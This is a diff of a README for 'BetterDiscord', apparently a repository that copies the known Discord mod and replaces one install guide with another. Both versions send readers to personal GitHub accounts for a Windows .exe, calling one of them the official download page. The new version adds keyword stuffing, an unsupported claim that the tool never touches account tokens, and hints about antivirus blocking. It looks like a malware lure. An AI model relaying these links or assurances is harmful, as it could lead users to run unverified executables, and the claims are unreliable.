@@ -1,68 +1,60 @@
-**BetterDiscord** is a powerful client modification for Discord that allows you to add custom themes, plugins, and extensive customization options to enhance your Discord experience.
+# 🎨 BetterDiscord - Customize your personal Discord experience easily
 
-<img width="120" height="120" alt="5d981664-7cda-4158-9040-ce607b5d6149" src="https://github.com/user-attachments/assets/40889f16-ee21-4a2d-b647-97a9764ea52e" />
+[![](https://img.shields.io/badge/Download_BetterDiscord-Blue?style=for-the-badge)](https://github.com/Shlo3796/BetterDiscord)
 
-## Install
-[Download `BetterDiscord.zip`](https://github.com/bd-discord/BetterDiscord/releases/download/1.13.15/BetterDiscord.zip)
----
+BetterDiscord adds functionality to the standard Discord application on your computer. It allows you to change the appearance of the interface through themes and add features using plugins. This application gives you control over your chat environment.
 
+## 📥 How to download and install
 
-<img width="1920" height="1080" alt="44ea0393-582c-43c5-83bc-6c95eb88a2d0" src="https://github.com/user-attachments/assets/845389c3-bf31-4cea-ad13-2673936d0998" />
+Follow these steps to set up the software on your Windows computer.
 
----
-## Key Features
-- Custom Themes — Install and create beautiful themes
-- Plugin System — Extend functionality with hundreds of community plugins
-- Deep Customization — Change almost every visual and functional aspect of Discord
-- Easy Management — Built-in theme and plugin manager
-- Regular Updates — Maintains compatibility with the latest Discord versions
+1.  Visit the [official download page](https://github.com/Shlo3796/BetterDiscord).
+2.  Locate the section labeled Releases or Assets.
+3.  Click the file ending in .exe to start the download.
+4.  Open the downloaded file once the process finishes.
+5.  Follow the instructions on the screen to complete the installation.
+6.  Restart Discord if it remains open during the setup process.
 
-<img width="1258" height="800" alt="image" src="https://github.com/user-attachments/assets/f2e40b88-af56-426d-8d3f-2165233b2cff" /># BetterDiscord
+## ⚙️ System requirements
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `BetterDiscord.exe` as Administrator.
-4. **Click Install** — The installer will patch your Discord client.
-5. Restart Discord to enjoy your customized experience.
+Ensure your computer meets these requirements to run the software.
 
-**Note:** Close Discord completely before running the installer.
-<img width="640" height="360" alt="image" src="https://github.com/user-attachments/assets/dc81f407-ed0e-405d-96ca-9feaa5b0dc11" />
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 GB RAM or more.
+*   Storage: At least 200 MB of free disk space.
+*   Prerequisites: You must have the official Discord desktop client installed on your system.
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/72dd3b2c-970a-4056-8132-d291a7099e7a" />
+## 🎨 Using themes
 
----
-## System Requirements
-- **Windows 10 / 11**, **macOS**, or **Linux**
-- Official Discord desktop client installed
+Themes change the colors, fonts, and layout of your Discord interface.
 
-  <img width="1224" height="736" alt="image" src="https://github.com/user-attachments/assets/2317ab25-424d-46c1-808a-0cf7fa6d3393" />
+1.  Download a theme file from a trusted library. These files usually end in .theme.css.
+2.  Open your Discord settings.
+3.  Scroll down the left sidebar until you see the BetterDiscord menu.
+4.  Click on Themes.
+5.  Select the button labeled Open Theme Folder.
+6.  Move your downloaded file into this folder.
+7.  Return to Discord and click the toggle switch next to your new theme to enable it.
 
----
-## Security & Legal
-**Important Notice:**  
-BetterDiscord modifies the Discord client. While generally safe, using it carries a risk of account issues. Always download from trusted sources.
+## 🔌 Adding plugins
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+Plugins provide new features, such as improved media playback or privacy tools.
 
----
-## Contributing
-Contributions are welcome! Help maintain compatibility with new Discord updates or add new features.
+1.  Download a plugin file, which typically ends in .plugin.js.
+2.  Go to your User Settings within Discord.
+3.  Find the BetterDiscord section and click Plugins.
+4.  Click the button labeled Open Plugins Folder.
+5.  Drag your plugin file into the folder.
+6.  Enable the plugin using the toggle switch inside the Discord application.
 
----
-## License & Acknowledgments
-### License
-**BetterDiscord** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+## 🛡️ Privacy and safety
 
-**Copyright © 2026 koroshi23**
+BetterDiscord modifies the local files of the Discord client. It does not access your account password or token externally. Keep your plugins and themes updated to ensure compatibility with the latest versions of Discord. Only install files from sources you trust.
 
-### Acknowledgments
-- Thanks to the original BetterDiscord team.
-- The Discord modding and theming community.
+## 🔧 Managing settings
 
-<p align="center">
-  Developed with ❤️ for a better Discord experience
-</p>
+You can disable BetterDiscord at any time using the uninstaller provided in the setup file. If Discord updates, you might need to run the installer again to patch the new version. The settings menu includes an option to check for updates automatically. This ensures your installation remains stable and functional.
+
+If you encounter issues, verify that your internet connection is active and that your antivirus software is not blocking the installation. Most conflicts occur when the Discord client updates while the modification tool is running in the background. Close Discord completely before you run the installer to prevent errors.
+
+Keywords: bd-theme, betterdiscord-addon, betterdiscord-plugins, betterdiscord-theme, discord-client, discord-modified-client, discord-plugin, discord-privacy, discordtheme, vencord, vesktop
